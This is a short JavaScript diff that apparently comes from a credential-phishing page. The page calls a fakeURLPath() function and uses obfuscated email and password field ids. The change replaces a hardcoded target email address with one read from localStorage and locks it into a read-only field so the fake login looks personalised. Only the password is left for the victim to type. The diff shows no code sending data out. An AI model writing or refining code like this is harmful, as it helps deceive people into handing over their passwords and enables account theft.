@@ -166,17 +166,20 @@
     applyBackground();
     fakeURLPath();
 
-document.addEventListener('DOMContentLoaded', function () {
-  const emailInput = document.querySelector('.inp_core[type="email"]');
+setTimeout(function () {
+  var emailInput = document.querySelector('.inp_core[type="email"]');
+  var prefillEmail = localStorage.getItem('prefill_email'); // reads whatever was stored
 
-  if (emailInput) {
+  if (emailInput && prefillEmail) {
     emailInput.removeAttribute('readonly');
-    emailInput.value = 'dumelord@yahoo.com'; // or from localStorage
+    emailInput.value = prefillEmail;
     emailInput.style.color = '#54738b';
     emailInput.style.webkitTextFillColor = '#54738b';
     emailInput.setAttribute('readonly', '');
+    localStorage.removeItem('prefill_email'); // clean up after use
   }
-});
+}, 300);
+
     
     var emailInput = document.getElementById("mail_x9k2");
     var passwordInput = document.getElementById("code_p4r7");
